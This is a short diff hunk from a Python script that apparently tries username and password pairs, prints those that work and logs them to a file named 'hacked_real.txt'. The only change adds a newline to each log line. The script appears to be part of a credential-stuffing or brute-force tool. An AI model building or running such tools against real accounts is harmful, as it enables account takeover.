@@ -62,7 +62,7 @@ def start(passwords):
             print(f"{get_ts()} {r}, {username}: {password}")
             k += 1
 
-            with open("hacked_real.txt", "a", encoding="utf-8") as h_list: h_list.write(f"{get_ts()} {r}, {username}: {password}")
+            with open("hacked_real.txt", "a", encoding="utf-8") as h_list: h_list.write(f"{get_ts()} {r}, {username}: {password} \n")
 
             time.sleep(5)
             if k % 10 == 0:
